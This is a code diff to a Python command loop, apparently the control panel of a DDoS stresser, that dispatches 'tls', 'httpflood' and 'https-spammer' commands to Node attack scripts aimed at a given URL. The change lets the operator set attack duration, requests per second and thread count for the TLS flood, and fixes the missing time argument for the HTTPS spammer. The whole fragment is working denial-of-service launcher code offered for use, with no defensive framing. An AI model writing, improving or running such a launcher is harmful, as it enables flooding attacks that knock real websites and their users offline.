@@ -524,11 +524,13 @@ def main():
         elif "tls" in cnc:
             try:
                 url = cnc.split()[1]
-                method = cnc.split()[2]
-                os.system(f'node tlsv5 {url} {time} 250 50')
+                time = cnc.split()[2]
+                reqper = cnc.split()[3]
+                threads = cnc.split()[4]
+                os.system(f'node tlsv5 {url} {time} {reqper} {threads}')
             except IndexError:
-                print('Usage: tls <url> <time>')
-                print('Example: tls http://example.com 60')
+                print('Usage: tls <url> <time> <req_per_second> <threads>')
+                print('Example: tls http://example.com 60 80 50')
 
         elif "httpflood" in cnc:
             try:
@@ -544,6 +546,7 @@ def main():
         elif "https-spammer" in cnc:
             try:
                 url = cnc.split()[1]
+                time = cnc.split()[2]
                 os.system(f'node HTTPS-SPAMMER {url} {time}')
             except IndexError:
                 print('Usage: https-spammer <url> <time>')
